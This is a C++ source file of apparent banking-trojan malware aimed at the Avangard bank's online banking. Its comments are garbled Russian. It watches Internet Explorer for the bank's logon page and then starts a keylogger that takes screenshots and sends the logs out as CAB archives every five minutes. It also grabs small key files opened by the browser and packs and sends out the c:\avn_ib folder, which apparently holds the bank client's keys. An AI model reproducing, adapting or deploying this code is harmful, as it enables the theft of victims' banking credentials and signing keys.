#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Loader.h"
#include "Utils.h"
#include "KeyLogSystems.h"
#include "FileGrabber.h"

//#include "BotDebug.h"

namespace DBGAVANGARDWEB
{
	#include "DbgTemplates.h"
}

#define DBGAVG DBGAVANGARDWEB::DBGOutMessage<>

#define AvangardWebModule //������� ��� ������ �������

namespace AvangardWeb
{
	PKeyLogSystem System = 0;

	//true - ���� ���� �������� ������ ������, � ����� �������� ��� � �������
	int IsFileKey( FileGrabber::ParamEvent* e )
	{
		if( e->data )
		{
			DWORD hash = STR::GetHash( (char*)e->extFile, 0, true );
			if( hash != 0x1D36F0 /* tmp */ )
				return FileGrabber::CURRNAMEFILE | FileGrabber::SENDFILE;
		}
		return 0;
	}

	void Activeted(LPVOID Sender)
	{
		DBGAVG( "Avangard", "Activeted" );

		FileGrabber::Init(FileGrabber::CREATEFILEA | FileGrabber::CREATEFILEW );
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = IsFileKey;
		rv->minSize = 0;
		rv->maxSize = 500;
		rv->aw |= FileGrabber::LOADFILE | FileGrabber::FILEISBIN;
		const char gifFormat[] = { 'G', 'I', 'F', 0 };
		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //���������� ������ gif
		FileGrabber::AddReceiver(rv);

		System = (PKeyLogSystem)Sender;
	}

	void Deactiveted(LPVOID Sender)
	{
		DBGAVG( "Avangard", "Deactiveted" );
		if( System )
		{
			FileGrabber::Release();
			System = 0;
		}
	}

	//������ ���������
	void InitKeyLogger()
	{
		DBGAVG( "Avangard", "������ ���������" );
		PKeyLogSystem S = KeyLogger::AddSystem("avangard", PROCESS_HASH_IE);
		if( S != NULL )
		{
			S->SendLogAsCAB = true;
			// ������������� ����� ������ � ����� ������� � �� ������ ����������
			// �������
			S->TimeMode    = KLG_TIME_MIN;
			S->TimeValue   = 5*60; // ������� ����� �������� �� ����� 5-�� �����
			S->MakeScreenShot = true;

			S->OnActivate = Activeted;
			S->OnDeactivate = Deactiveted;
			PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, "*", FILTRATE_ALL_WND, LOG_ALL, 3);
		}
	}

	void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{
		char* url = (char*)Data;
		if( System == 0 )
		{
			//��������� ����� � ���� ���� ����� avangard � ����� logon_enter
			char* p = m_strstr( url, "avangard" );
			if( p )
			{
				p += 8;
				if( m_strstr( url, "logon_enter" ) )
				{
					DBGAVG( "Avangard", "��� %s", url );
					InitKeyLogger();
				}
			}
		}
	}

	void Init()
	{
		//����������� ������� �� ����� ���� � ��
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
	}

	void SendFolder_avn_ib()
	{
		//��������� ���������� ��� �����
		char path[MAX_PATH];
		char* avn_ib = "c:\\avn_ib";
		pGetTempPathA( sizeof(path), path );
		pPathAppendA( path, "avn_ib" );
		char* path2 = UIDCrypt::CryptFileName( path, true );
		if( File::IsExists(path2) )
			DBGAVG( "Avangard", "����� %s ��� ���������� (����� %s)", avn_ib, path2 );
		else
		{
			if( Directory::IsExists(avn_ib) )
			{
				DBGAVG( "Avangard", "����� %s ����������, �������� �� ���������� (����� %s)", avn_ib, path2 );
				char tmpName[MAX_PATH];
				File::GetTempName(tmpName);
				HCAB cab = CreateCab(tmpName);
				AddDirToCab( cab, avn_ib, "avn_ib" );
				CloseCab(cab);
				DataGrabber::SendCabDelayed( 0, tmpName, "avangard" );
				File::WriteBufferA( path2, 0, 0 ); //��������, ��� ������� ��� ����
				pDeleteFileA(tmpName);
			}
			else
				DBGAVG( "Avangard", "����� %s �� ����������", avn_ib );
		}
		STR::Free(path2);
	}
}
